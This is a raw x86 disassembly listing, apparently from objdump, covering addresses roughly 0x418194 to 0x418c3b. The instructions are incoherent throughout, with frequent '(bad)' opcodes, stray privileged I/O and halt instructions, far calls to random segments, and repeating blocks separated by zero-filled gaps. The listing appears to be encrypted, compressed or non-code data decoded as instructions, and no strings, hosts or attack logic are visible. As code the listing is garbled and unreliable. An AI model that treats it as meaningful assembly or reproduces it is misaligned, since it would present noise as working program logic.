  418194:	and    BYTE PTR [esi],dl
  418196:	and    ah,BYTE PTR ds:0x93a26d95
  41819c:	push   ds
  41819d:	clc    
  41819e:	js     0x418176
  4181a0:	in     eax,dx
  4181a1:	xchg   ecx,eax
  4181a2:	fdivr  QWORD PTR [ebx]
  4181a4:	sar    BYTE PTR [edx],cl
  4181a6:	push   0x59
  4181a8:	add    eax,0xf02fccb
  4181ad:	jo     0x4181f9
  4181af:	adc    eax,0xe23b035e
  4181b4:	cmp    eax,0xfbbaf49
  4181b9:	jbe    0x41817d
  4181bb:	cmp    al,0x98
  4181bd:	dec    ecx
  4181be:	das    
  4181bf:	push   ecx
  4181c0:	lahf   
  4181c1:	push   esi
  4181c2:	cmp    eax,0x6fbdf35a
  4181c7:	push   esi
  4181c8:	shr    DWORD PTR [esi+ecx*2],0xea
  4181cc:	cdq    
  4181cd:	jne    0x418239
  4181cf:	loope  0x4181c6
  4181d1:	pop    edx
  4181d2:	cli    
  4181d3:	cmc    
  4181d4:	(bad)  
  4181d5:	out    dx,eax
  4181d6:	lahf   
  4181d7:	(bad)  
  4181d8:	in     al,0xc3
  4181da:	pop    ebx
  4181db:	data16 fcmovbe st,st(7)
  4181de:	push   edi
  4181df:	hlt    
  4181e0:	and    eax,0x93dbe457
  4181e5:	fisub  DWORD PTR [ebp-0x25db036]
  4181eb:	adc    bh,al
  4181ed:	sbb    eax,0x52b58630
  4181f2:	and    al,BYTE PTR [ebx]
  4181f4:	and    esp,DWORD PTR [ebp+eax*2+0x23]
  4181f8:	pushf  
  4181f9:	lods   al,BYTE PTR ds:[esi]
  4181fa:	pop    bp
  4181fc:	jnp    0x41820a
  4181fe:	add    BYTE PTR [edi],cl
  418200:	and    BYTE PTR [edi+0x5d307dbd],ch
  418206:	dec    esp
  418207:	imul   BYTE PTR [ebx+0x29]
  41820a:	or     al,0xb5
  41820c:	or     ebp,esp
  41820e:	or     BYTE PTR [ecx+0x0],dh
	...
  418271:	add    BYTE PTR [eax],al
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xefdb8d6
  418282:	jns    0x418284
  418284:	nop
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	test   eax,0xefd11d21
  418291:	push   cs
  418292:	mov    bh,0x96
  418294:	enter  0x8a29,0x94
  418298:	jmp    0x41828c
  41829a:	fiadd  DWORD PTR [esi]
  41829c:	mov    dl,0xc0
  41829e:	xchg   ecx,eax
  41829f:	fsub   st(3),st
  4182a1:	fcomp  DWORD PTR [eax+eax*1-0x7da148f3]
  4182a8:	outs   dx,BYTE PTR ds:[esi]
  4182a9:	in     al,0xfc
  4182ab:	sbb    BYTE PTR [edi+ebx*2-0x30],bh
  4182af:	add    eax,0x43275d6c
  4182b4:	daa    
  4182b5:	sub    dl,cl
  4182b7:	sbb    ah,bl
  4182b9:	cmp    ah,BYTE PTR [edx]
  4182bb:	add    eax,0x4bf547db
  4182c0:	cmovno ebx,DWORD PTR [edx-0x1df3fe27]
  4182c7:	ret    
  4182c8:	or     DWORD PTR [edi-0x7c8ca5d2],edi
  4182ce:	pop    ecx
  4182cf:	adc    BYTE PTR ds:0xf0dbc183,cl
  4182d5:	imul   dl
  4182d7:	cmp    al,0x39
  4182d9:	ficomp WORD PTR [edi+0x7a]
  4182dc:	dec    eax
  4182dd:	repz adc eax,0x403c0e7b
  4182e3:	bound  ebp,QWORD PTR [ecx+edx*4]
  4182e6:	enter  0x29b6,0xfa
  4182ea:	ror    DWORD PTR [eax+0x4c],1
  4182ed:	test   DWORD PTR [edi-0x48ca1d84],ebp
  4182f3:	stc    
  4182f4:	rol    DWORD PTR [eax-0x6f],0x27
  4182f8:	xlat   BYTE PTR ds:[ebx]
  4182f9:	mov    esi,0x421d95f8
  4182fe:	mov    ds:0x1a243df1,al
  418303:	test   eax,0x4bd9a37
  418308:	mov    DWORD PTR [ebp+0x64],ebp
  41830b:	mov    esi,0xab1c9875
  418310:	mov    bl,0xdb
  418312:	out    0x2d,al
  418314:	and    DWORD PTR [edi*8-0x34e4d41a],edx
  41831b:	cmp    ebp,DWORD PTR [ebx]
  41831d:	push   ds
  41831e:	mov    ds:0x6f996b53,eax
  418323:	out    dx,al
  418324:	jecxz  0x41838f
  418326:	mov    al,0xde
  418328:	jo     0x418372
  41832a:	inc    eax
  41832b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41832c:	lods   al,BYTE PTR ds:[esi]
  41832d:	xchg   edx,eax
  41832e:	std    
  41832f:	dec    edx
  418330:	pop    edx
  418331:	xor    DWORD PTR [eax+0xfd72ef1],esp
  418337:	out    dx,al
  418338:	icebp  
  418339:	push   0x8e0338fb
  41833e:	stos   BYTE PTR es:[edi],al
  41833f:	(bad)  
  418340:	jb     0x418356
  418342:	in     eax,dx
  418343:	leave  
  418344:	xchg   dh,bh
  418346:	pusha  
  418347:	and    BYTE PTR [ecx],cl
  418349:	mov    DWORD PTR [eax+ebp*8-0xd580b2c],ecx
  418350:	sar    eax,cl
  418352:	push   ds
  418353:	ins    BYTE PTR es:[edi],dx
  418354:	pop    eax
  418355:	dec    eax
  418356:	dec    eax
  418357:	xchg   DWORD PTR [ecx],eax
  418359:	and    eax,0xc6b53aed
  41835e:	out    dx,eax
  41835f:	outs   dx,BYTE PTR ds:[esi]
  418360:	push   esi
  418361:	pop    eax
  418362:	les    eax,FWORD PTR [ebx+eax*1+0x587ee38f]
  418369:	fnstcw WORD PTR [esp+edx*4]
  41836c:	ret    
  41836d:	push   esi
  41836e:	daa    
  41836f:	push   eax
  418370:	ficom  DWORD PTR [ecx+edx*4-0xd]
  418374:	sub    ch,BYTE PTR [ecx-0x3099fc4d]
  41837a:	adc    BYTE PTR [edx+0x7a],dh
  41837d:	stos   BYTE PTR es:[edi],al
  41837e:	(bad)  
  41837f:	not    DWORD PTR [eax-0x66fd7564]
  418385:	and    edi,DWORD PTR [ebp+0x6e]
  418388:	js     0x41837d
  41838a:	jle    0x4183cc
  41838c:	retf   0xb697
  41838f:	lock add BYTE PTR [eax],al
	...
  4183f2:	add    BYTE PTR [eax],al
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	jbe    0x418412
  418402:	(bad)  
  418403:	ds xchg esp,eax
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	rcl    DWORD PTR [esi+0x6f],0xcd
  418410:	out    dx,al
  418411:	daa    
  418412:	or     al,0xcc
  418414:	out    0x8e,al
  418416:	lock retf 
  418418:	push   edi
  418419:	xor    bl,BYTE PTR [ebx-0x79003973]
  41841f:	jl     0x418488
  418421:	jp     0x4183c2
  418423:	or     BYTE PTR [ebp+0x13],cl
  418426:	fwait
  418427:	out    0x85,eax
  418429:	dec    esp
  41842a:	or     bh,BYTE PTR [eax+0x231b751b]
  418430:	sub    DWORD PTR [eax],esi
  418432:	test   dl,cl
  418434:	(bad)  
  418436:	fsubr  DWORD PTR [eax-0x7639e717]
  41843c:	lea    esp,[esi-0x7a]
  41843f:	pop    ss
  418440:	fwait
  418441:	lock and DWORD PTR [ecx+0x223a952e],0x1f8f0ff2
  41844c:	push   es
  41844d:	adc    esp,DWORD PTR [ebp+0x3a]
  418450:	ret    0x9aec
  418453:	jg     0x418445
  418455:	cmp    BYTE PTR [ebx],ah
  418457:	out    dx,eax
  418458:	sub    BYTE PTR [ecx],ch
  41845a:	pop    ebx
  41845b:	jae    0x418402
  41845d:	cmp    al,BYTE PTR [edi-0x20]
  418460:	call   0x98fa:0x72bf6278
  418467:	push   esp
  418468:	cmp    dh,cl
  41846a:	push   edx
  41846b:	jns    0x4184cb
  41846d:	(bad)  
  41846e:	(bad)  
  41846f:	icebp  
  418470:	jae    0x41845b
  418472:	mov    ebx,0x9327255d
  418477:	das    
  418478:	inc    edi
  418479:	or     DWORD PTR [ebx-0x42],0x6638d18f
  418480:	and    BYTE PTR [edi+0x3a],cl
  418483:	pop    ebx
  418484:	hlt    
  418485:	(bad)  
  418486:	push   cs
  418487:	mov    edi,0x9525349d
  41848c:	shr    DWORD PTR ds:[edx],1
  41848f:	int    0x62
  418491:	mov    eax,ds:0x59c52e28
  418496:	pop    esp
  418497:	ja     0x418500
  418499:	mov    esi,0x9fe4b379
  41849e:	call   0x4fe3:0x7f4109
  4184a5:	lods   al,BYTE PTR ds:[esi]
  4184a6:	jb     0x418462
  4184a8:	inc    eax
  4184a9:	mov    ds:0x6cf51320,eax
  4184ae:	ret    
  4184af:	es pop ecx
  4184b1:	aam    0x4c
  4184b3:	xlat   BYTE PTR ds:[ebx]
  4184b4:	lds    ebp,FWORD PTR [edx+eax*1]
  4184b7:	add    eax,0x8685d5f1
  4184bc:	jo     0x41843e
  4184be:	js     0x41846a
  4184c0:	stc    
  4184c1:	call   0xd135:0x879f8c5
  4184c8:	mov    al,ds:0x654c0953
  4184cd:	scas   al,BYTE PTR es:[edi]
  4184ce:	dec    eax
  4184cf:	sti    
  4184d0:	sub    esp,DWORD PTR [ecx]
  4184d2:	mov    al,ds:0xaa7d5c5b
  4184d7:	rol    DWORD PTR [edx],cl
  4184d9:	push   ebx
  4184da:	iret   
  4184db:	pop    esp
  4184dc:	fnstcw WORD PTR [edx+0x61]
  4184df:	cdq    
  4184e0:	mov    edx,0x5d426baf
  4184e5:	mov    cl,0x3c
  4184e7:	les    ecx,FWORD PTR [ecx+0x2b]
  4184ea:	jecxz  0x41853b
  4184ec:	pop    ebp
  4184ed:	push   ebx
  4184ee:	add    BYTE PTR [edx],dl
  4184f0:	jg     0x418498
  4184f2:	xor    BYTE PTR [ebp+0x8],cl
  4184f5:	cwde   
  4184f6:	push   edi
  4184f7:	in     eax,0xf
  4184f9:	pusha  
  4184fa:	ret    
  4184fb:	xchg   esi,eax
  4184fc:	js     0x41850c
  4184fe:	retf   
  4184ff:	mov    bh,0xb8
  418501:	mov    cl,0x37
  418503:	je     0x418558
  418505:	pop    ebx
  418506:	rcr    BYTE PTR [eax-0x17],1
  418509:	jge    0x41857e
  41850b:	dec    eax
  41850c:	cmp    DWORD PTR [ebp+0x7753],0x0
	...
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	cld    
  418581:	aad    0xb2
  418583:	stos   DWORD PTR es:[edi],eax
  418584:	cwde   
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	sbb    edx,DWORD PTR ds:0x896951eb
  418592:	shl    DWORD PTR [ebx+0x3b],cl
  418595:	push   es
  418596:	dec    edx
  418597:	in     eax,0x96
  418599:	xchg   esp,eax
  41859a:	js     0x418596
  41859c:	inc    ebp
  41859d:	call   0x312173bb
  4185a2:	mov    al,0x5d
  4185a4:	(bad)  
  4185a5:	dec    eax
  4185a6:	xor    DWORD PTR [ebp+0x5],edx
  4185a9:	scas   eax,DWORD PTR es:[edi]
  4185aa:	jle    0x4185f6
  4185ac:	or     DWORD PTR [edi+edi*2-0x7b],0xffffffab
  4185b1:	mov    ecx,DWORD PTR [ebx]
  4185b3:	fcom   DWORD PTR [ecx-0x3d]
  4185b6:	das    
  4185b7:	cs fcompp 
  4185ba:	inc    esp
  4185bb:	call   0xacdc:0x2155ce78
  4185c2:	jle    0x418588
  4185c4:	xorps  xmm4,XMMWORD PTR [edi-0x55]
  4185c8:	or     DWORD PTR ds:[edi],eax
  4185cb:	loope  0x4185c3
  4185cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185ce:	and    ch,ah
  4185d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185d1:	addr16 sub eax,0x53a21e6a
  4185d7:	xchg   esi,eax
  4185d8:	test   DWORD PTR [esi+0x3e],0x6f7c9fcb
  4185df:	es sub al,0xfe
  4185e2:	push   eax
  4185e3:	sahf   
  4185e4:	in     eax,0x19
  4185e6:	lods   eax,DWORD PTR ds:[esi]
  4185e7:	sbb    esp,DWORD PTR [esi]
  4185e9:	cli    
  4185ea:	add    BYTE PTR [ebx+eiz*1],0xbf
  4185ee:	loopne 0x41860b
  4185f0:	mov    ebp,0xf01aa496
  4185f5:	xchg   BYTE PTR [ebp+0x33],dh
  4185f8:	sbb    bh,BYTE PTR [ebp-0x54]
  4185fb:	sbb    edi,DWORD PTR [eax]
  4185fd:	jecxz  0x41860e
  4185ff:	jmp    0x4185e8
  418601:	gs mov ch,0xd0
  418604:	jo     0x4185c7
  418606:	dec    esp
  418607:	into   
  418608:	fisub  DWORD PTR [ebp-0x490e6868]
  41860e:	(bad)  
  41860f:	sub    DWORD PTR [eax-0x5f],esp
  418612:	test   eax,0x26502eed
  418617:	mov    eax,ds:0xcd7d8823
  41861c:	test   eax,0xe9b1566
  418621:	mov    ebp,0x85adc665
  418626:	inc    esi
  418627:	(bad)  
  418628:	lods   al,BYTE PTR ds:[esi]
  418629:	(bad)  
  41862a:	and    eax,0x6b063cdd
  41862f:	imul   ebp,ebx,0x39
  418632:	push   es
  418633:	clc    
  418634:	inc    esi
  418635:	aas    
  418636:	ins    DWORD PTR es:[edi],dx
  418637:	dec    ebx
  418638:	sub    cl,BYTE PTR [esi]
  41863a:	les    ebx,FWORD PTR [edi+0x2a]
  41863d:	and    bl,ch
  41863f:	leave  
  418640:	bound  ebx,QWORD PTR [ebx-0x60]
  418643:	push   0xb6df29ff
  418648:	xchg   ebx,eax
  418649:	xchg   edx,eax
  41864a:	int    0x43
  41864c:	fcmovb st,st(6)
  41864e:	out    dx,al
  41864f:	inc    edx
  418650:	cli    
  418651:	inc    eax
  418652:	push   eax
  418653:	pop    ds
  418654:	push   eax
  418655:	push   ebx
  418656:	pop    esi
  418657:	nop
  418658:	fwait
  418659:	cmp    cl,dl
  41865b:	pop    esp
  41865c:	cwde   
  41865d:	in     eax,0x9b
  41865f:	daa    
  418660:	jbe    0x4185f3
  418662:	fs pop ecx
  418664:	sub    DWORD PTR [ebp+0x13],ecx
  418667:	jmp    0xd0cc:0xcf53ace1
  41866e:	stos   BYTE PTR es:[edi],al
  41866f:	cwde   
  418670:	imul   edi,DWORD PTR [ebx+0x308e4534],0x52
  418677:	pop    esp
  418678:	loope  0x418635
  41867a:	mov    ah,0xcb
  41867c:	sbb    cl,BYTE PTR [ebx-0x543a79f9]
  418682:	mov    ch,0x7d
  418684:	and    ecx,ecx
  418686:	mov    ?,WORD PTR [eax-0x10ebd689]
  41868c:	cwde   
  41868d:	dec    eax
  41868e:	dec    ebp
  41868f:	pop    ecx
	...
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	test   BYTE PTR [edx+0x29cc6be],bl
  418706:	add    DWORD PTR [eax],eax
  418708:	add    al,0x1
  41870a:	add    BYTE PTR [eax],al
  41870c:	lahf   
  41870d:	lea    edi,[esi]
  41870f:	inc    eax
  418710:	arpl   WORD PTR [esi-0x26250c43],ax
  418716:	ret    
  418717:	gs sti 
  418719:	xor    eax,0x30d32c95
  41871e:	test   BYTE PTR cs:[esi],bl
  418721:	fsubr  QWORD PTR [esi]
  418723:	retf   
  418724:	push   cs
  418725:	mov    dh,0x9b
  418727:	jnp    0x418726
  418729:	shr    BYTE PTR [eax+eiz*4],1
  41872c:	cdq    
  41872d:	dec    esi
  41872e:	imul   ebp,esi,0x3c
  418731:	dec    eax
  418732:	add    edi,ebp
  418734:	fcomi  st,st(6)
  418736:	cwde   
  418737:	bound  ecx,QWORD PTR [ebx+0x7b]
  41873a:	jmp    0x418709
  41873c:	clc    
  41873d:	xor    al,BYTE PTR [esi+0x5caa3f69]
  418743:	jmp    0x418790
  418745:	adc    BYTE PTR [esi-0x29],0x69
  418749:	mov    ah,0xc3
  41874b:	inc    eax
  41874c:	push   ecx
  41874d:	lock mov al,ds:0x76a64d4
  418753:	call   0x90beedd4
  418758:	outs   dx,BYTE PTR ds:[esi]
  418759:	cli    
  41875a:	xor    eax,0xcd46f0bd
  41875f:	retf   
  418760:	js     0x418793
  418762:	jo     0x41875a
  418764:	(bad)  
  418766:	or     eax,0x3adb9673
  41876b:	pop    edx
  41876c:	push   0xae3eb26f
  418771:	cmp    ebp,DWORD PTR [edi-0x79]
  418774:	or     al,0x36
  418776:	cmc    
  418777:	fisubr DWORD PTR [ebp-0x1e]
  41877a:	xchg   ecx,eax
  41877b:	pop    eax
  41877c:	mov    ebp,0x9d9d0cd5
  418781:	inc    esi
  418782:	test   DWORD PTR [edx],0x3234204a
  418788:	popf   
  418789:	not    DWORD PTR [ebx]
  41878b:	inc    edi
  41878c:	(bad)  
  41878d:	imul   esp,DWORD PTR [ecx-0x6a3e3061],0x4a22f806
  418797:	lahf   
  418798:	inc    edi
  418799:	sbb    BYTE PTR [ebx+0x46893a3a],dh
  41879f:	es (bad) 
  4187a1:	fcom   st(1)
  4187a3:	pop    ebp
  4187a4:	mov    esp,0x7518ea56
  4187a9:	push   eax
  4187aa:	mov    eax,0xb910e544
  4187af:	cmp    eax,0x59b21729
  4187b4:	and    eax,0xdb817b86
  4187b9:	mov    edi,0x3addda33
  4187be:	pop    ds
  4187bf:	in     eax,0xa2
  4187c1:	cld    
  4187c2:	add    al,0x3d
  4187c4:	add    eax,0x6faed6eb
  4187c9:	jmp    0x41880a
  4187cb:	adc    BYTE PTR [ecx+0x3b],ch
  4187ce:	and    DWORD PTR [eax-0x62026d23],edi
  4187d4:	push   0xffffffed
  4187d6:	cwde   
  4187d7:	mov    al,0x21
  4187d9:	imul   edx,DWORD PTR [eax-0x3f03c7d8],0x58379c93
  4187e3:	ja     0x41884b
  4187e5:	(bad)  
  4187e6:	lds    esi,FWORD PTR [eax-0x28]
  4187e9:	mov    al,ds:0x4a637ea6
  4187ee:	cmp    edi,edi
  4187f0:	mov    ebp,0x12fac61c
  4187f5:	out    dx,al
  4187f6:	or     ebx,DWORD PTR [eax+0x5c]
  4187f9:	mov    DWORD PTR [edx],edi
  4187fb:	cdq    
  4187fc:	clc    
  4187fd:	jnp    0x4187b5
  4187ff:	fs mov dl,0xd8
  418802:	cdq    
  418803:	sti    
  418804:	ins    DWORD PTR es:[edi],dx
  418805:	add    DWORD PTR [edx-0xdde1411],ebp
  41880b:	adc    dl,BYTE PTR [edi+0x50]
  41880e:	sub    esi,esi
	...
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x239c3acd]
  418881:	enter  0xe228,0xa0
  418885:	add    eax,DWORD PTR [ecx]
  418887:	add    BYTE PTR [ecx+eax*1],al
  41888a:	add    BYTE PTR [eax],al
  41888c:	test   eax,eax
  41888e:	in     eax,0x70
  418890:	or     DWORD PTR [esi+0x271eb25],esp
  418896:	(bad)  
  418897:	pop    edi
  418898:	mov    ds:0xa64a5971,eax
  41889d:	jl     0x41890c
  41889f:	jns    0x418864
  4188a1:	popf   
  4188a2:	es cmc 
  4188a4:	cmp    eax,0xdc524aca
  4188a9:	jg     0x4188e2
  4188ab:	ror    DWORD PTR ds:0x73c6c396,0x20
  4188b2:	cwde   
  4188b3:	or     eax,0xb40202be
  4188b8:	cmp    cl,0x9c
  4188bb:	inc    esp
  4188bc:	cmc    
  4188bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188be:	outs   dx,DWORD PTR ds:[esi]
  4188bf:	pop    eax
  4188c0:	xchg   edi,eax
  4188c1:	sar    BYTE PTR [edx],cl
  4188c3:	(bad)  
  4188c4:	out    dx,eax
  4188c5:	(bad)  
  4188c6:	nop
  4188c7:	dec    WORD PTR [ecx-0x29de8388]
  4188ce:	ficomp WORD PTR ss:[edi+0x5af3a2ea]
  4188d6:	in     al,0x12
  4188d8:	sbb    bh,ch
  4188da:	dec    edi
  4188db:	jl     0x418921
  4188dd:	out    0x3f,al
  4188df:	cdq    
  4188e0:	retf   0x807c
  4188e3:	sbb    al,bh
  4188e5:	jge    0x41893d
  4188e7:	dec    ecx
  4188e8:	and    bh,BYTE PTR gs:[ecx-0x5854242a]
  4188ef:	(bad)  
  4188f1:	dec    esi
  4188f2:	xchg   esp,eax
  4188f3:	and    bh,BYTE PTR [ebx+0x58]
  4188f6:	adc    ebp,DWORD PTR [ebp-0x7d496ad9]
  4188fc:	jge    0x4188f1
  4188fe:	fcom   QWORD PTR [eax+0xe]
  418901:	pop    ebp
  418902:	and    eax,0x3e984572
  418907:	mov    al,ah
  418909:	and    al,0xdb
  41890b:	and    dh,al
  41890d:	push   ebx
  41890e:	call   0x70c1de2a
  418913:	pushf  
  418914:	lods   al,BYTE PTR ds:[esi]
  418915:	mov    ebp,0x4b6a25f
  41891a:	pop    edx
  41891b:	dec    edx
  41891c:	ret    0x26a4
  41891f:	add    al,0xcf
  418921:	push   esi
  418922:	fwait
  418923:	popa   
  418924:	xchg   esp,eax
  418925:	sti    
  418926:	les    ebx,FWORD PTR [eax-0x2e]
  418929:	(bad)  
  41892a:	data16 fwait
  41892c:	jle    0x418931
  41892e:	mov    al,0x10
  418930:	xchg   BYTE PTR [edx-0x20e99828],bl
  418936:	sub    bl,dl
  418938:	test   DWORD PTR [edi-0x1f],edi
  41893b:	test   DWORD PTR [ebx-0x11],edi
  41893e:	push   edx
  41893f:	popa   
  418940:	mov    esi,DWORD PTR [ecx+0x30]
  418943:	sbb    al,BYTE PTR [ebx]
  418945:	add    dl,BYTE PTR [ecx-0x4b]
  418948:	retf   0xc008
  41894b:	test   DWORD PTR [ecx-0x3bea3fc4],0xf82fd55a
  418955:	shl    BYTE PTR [ecx-0x4dfdeabc],1
  41895b:	call   0x347b4511
  418960:	iret   
  418961:	ds xor eax,0xa7c3d747
  418967:	jne    0x418919
  418969:	mov    ah,al
  41896b:	push   0x85b0ea9
  418970:	jb     0x4189a5
  418972:	cmp    DWORD PTR [ecx-0x19],eax
  418975:	jle    0x418904
  418977:	add    esi,DWORD PTR [ebx-0x2e]
  41897a:	jns    0x418966
  41897c:	add    dh,bh
  41897e:	adc    edx,ebx
  418980:	mov    sp,0x2320
  418984:	mov    esp,0xd55700b6
  418989:	aad    0xd2
  41898b:	loope  0x418990
  41898d:	sbb    BYTE PTR [ebx-0x4],ch
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xe3833569
  418a03:	call   0x428eac
  418a08:	add    al,0x1
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	jbe    0x418996
  418a0e:	mov    edi,0xe12f366b
  418a13:	push   0x4b
  418a15:	scas   al,BYTE PTR es:[edi]
  418a16:	jge    0x418a20
  418a18:	stos   DWORD PTR es:[edi],eax
  418a19:	lods   al,BYTE PTR ds:[esi]
  418a1a:	pop    ebx
  418a1b:	dec    ecx
  418a1c:	rcl    DWORD PTR [ecx+0x23],cl
  418a1f:	fnstsw WORD PTR [ebp+0x66b95977]
  418a25:	sub    ebp,0xffffffc3
  418a28:	int    0xa2
  418a2a:	ss fs (bad) 
  418a2d:	scas   al,BYTE PTR es:[edi]
  418a2e:	gs call 0x4099:0x43620b06
  418a36:	mov    ebx,0xa8dd4f6c
  418a3b:	jmp    0xcf90:0x181b8b07
  418a42:	push   eax
  418a43:	pop    ecx
  418a44:	xor    BYTE PTR [ebx+0xc],ah
  418a47:	pop    eax
  418a48:	rcl    BYTE PTR [edi-0x39e8a632],1
  418a4e:	sar    DWORD PTR [esi],1
  418a50:	loopne 0x418a5e
  418a52:	lods   eax,DWORD PTR ds:[esi]
  418a53:	mov    dh,0x77
  418a55:	(bad)  
  418a56:	stos   DWORD PTR es:[edi],eax
  418a57:	sub    al,0x45
  418a59:	cwde   
  418a5a:	mov    bh,0x5f
  418a5c:	xor    al,0xc2
  418a5e:	out    0x8,eax
  418a60:	data16 jbe 0x418aca
  418a63:	adc    al,0xb2
  418a65:	(bad)  
  418a66:	mov    eax,0xc730e2e1
  418a6b:	xchg   ebp,eax
  418a6c:	jb     0x418ade
  418a6e:	push   edx
  418a6f:	test   al,0x84
  418a71:	sub    ch,BYTE PTR [edi-0x419d69bf]
  418a77:	in     al,0xe6
  418a79:	pop    DWORD PTR [eax+0x197cb92b]
  418a7f:	jnp    0x418a17
  418a81:	stos   BYTE PTR es:[edi],al
  418a82:	jo     0x418a52
  418a84:	(bad)  
  418a85:	jnp    0x418a24
  418a87:	pop    ecx
  418a88:	cli    
  418a89:	fwait
  418a8a:	cmp    eax,0x20088ce2
  418a8f:	adc    esi,esi
  418a91:	ins    BYTE PTR es:[edi],dx
  418a92:	lea    ebx,[ecx]
  418a94:	jg     0x418a55
  418a96:	push   esp
  418a97:	enter  0x8362,0x86
  418a9b:	push   eax
  418a9c:	test   ch,0x90
  418a9f:	not    cl
  418aa1:	mov    dh,0x20
  418aa3:	xor    dh,cl
  418aa5:	mov    eax,0xf0b9e0a8
  418aaa:	lods   al,BYTE PTR ds:[esi]
  418aab:	pop    ecx
  418aac:	clc    
  418aad:	cmp    ecx,0x5e8c423c
  418ab3:	dec    ebx
  418ab4:	add    bh,BYTE PTR [eax-0x428046a3]
  418aba:	in     al,dx
  418abb:	adc    edi,DWORD PTR [eax-0x80]
  418abe:	jbe    0x418ab6
  418ac0:	test   eax,0xe346dc1c
  418ac5:	daa    
  418ac6:	les    eax,FWORD PTR [edx+ebx*8-0x49102a2f]
  418acd:	cmp    dh,BYTE PTR [edx+edx*8-0x4e]
  418ad1:	bound  edi,QWORD PTR [edx+0x3765dffb]
  418ad7:	xor    ecx,0xd297bed5
  418add:	sbb    eax,0x486b56b6
  418ae2:	or     bl,ah
  418ae4:	(bad)  
  418ae5:	scas   al,BYTE PTR es:[edi]
  418ae6:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  418ae8:	test   al,0x5c
  418aea:	rcr    BYTE PTR [edi+edx*1-0x271055cf],cl
  418af1:	mov    esi,0x4c811f83
  418af6:	out    dx,eax
  418af7:	mov    ebx,esp
  418af9:	sub    al,0x8b
  418afb:	ret    0x2815
  418afe:	push   eax
  418aff:	rol    BYTE PTR ds:0x2df26d5c,0x80
  418b06:	pop    ss
  418b07:	adc    al,0x2e
  418b09:	test   eax,0xd47806c6
  418b0e:	jge    0x418b47
	...
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x75
  418b81:	pop    edi
  418b82:	sbb    DWORD PTR [ebp+0x105a8],esi
  418b88:	add    al,0x1
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	jp     0x418b78
  418b8e:	mov    edi,0xe3e1ff34
  418b93:	sbb    cl,BYTE PTR [eax+0x3d002b18]
  418b99:	out    dx,eax
  418b9a:	mov    edi,edx
  418b9c:	fs pop ds
  418b9e:	ds enter 0x35d4,0x57
  418ba3:	pop    ebp
  418ba4:	aas    
  418ba5:	mov    edx,0xea3e7d3f
  418baa:	dec    edx
  418bab:	jl     0x418b98
  418bad:	sbb    eax,0xcbf76ee0
  418bb2:	pop    eax
  418bb3:	and    dl,BYTE PTR [esi-0x2abbc219]
  418bb9:	jl     0x418ba4
  418bbb:	in     al,dx
  418bbc:	push   ds
  418bbd:	jmp    0x418b74
  418bbf:	sub    edi,DWORD PTR [esi+edi*2+0x7696ae2f]
  418bc6:	js     0x418bc9
  418bc8:	ds ja  0x418c49
  418bcb:	xor    edi,DWORD PTR [edx-0x5aa3bd1a]
  418bd1:	dec    ecx
  418bd2:	scas   eax,DWORD PTR es:[edi]
  418bd3:	sbb    ebx,DWORD PTR [edx]
  418bd5:	xor    DWORD PTR [esi-0x2bbe3f1a],0x1aaca0dc
  418bdf:	fdivr  QWORD PTR [eax]
  418be1:	in     al,0xc7
  418be3:	aas    
  418be4:	or     edi,DWORD PTR [edi]
  418be6:	pop    esi
  418be7:	pop    ss
  418be8:	mov    BYTE PTR ds:0xb78c7a7a,bh
  418bee:	in     eax,dx
  418bef:	xor    eax,0x542cc26f
  418bf4:	or     ch,BYTE PTR [ebp+0x77]
  418bf7:	fiadd  WORD PTR [ecx-0x2f60df18]
  418bfd:	aaa    
  418bfe:	lahf   
  418bff:	push   eax
  418c00:	push   ebp
  418c01:	jae    0x418b97
  418c03:	add    BYTE PTR [edx+0x12],dh
  418c06:	into   
  418c07:	and    dh,BYTE PTR [edi+0x4af92c0b]
  418c0d:	adc    eax,0xddf521e2
  418c12:	jns    0x418c5a
  418c14:	scas   eax,DWORD PTR es:[edi]
  418c15:	mov    bl,dl
  418c17:	mov    ds:0xe4f9ed97,al
  418c1c:	mov    ds:0xcedac081,al
  418c21:	pop    ecx
  418c22:	cmp    eax,DWORD PTR [ecx+0x73]
  418c25:	es pop ss
  418c27:	pop    ebx
  418c28:	ret    0x4a4f
  418c2b:	shr    DWORD PTR [ebx-0x5577d469],0xc4
  418c32:	sub    BYTE PTR [eax-0x988305e],ah
  418c38:	and    BYTE PTR [edx],0x8c
  418c3b:	sub    BYTE PTR [edi+0x35b301db],0xf3
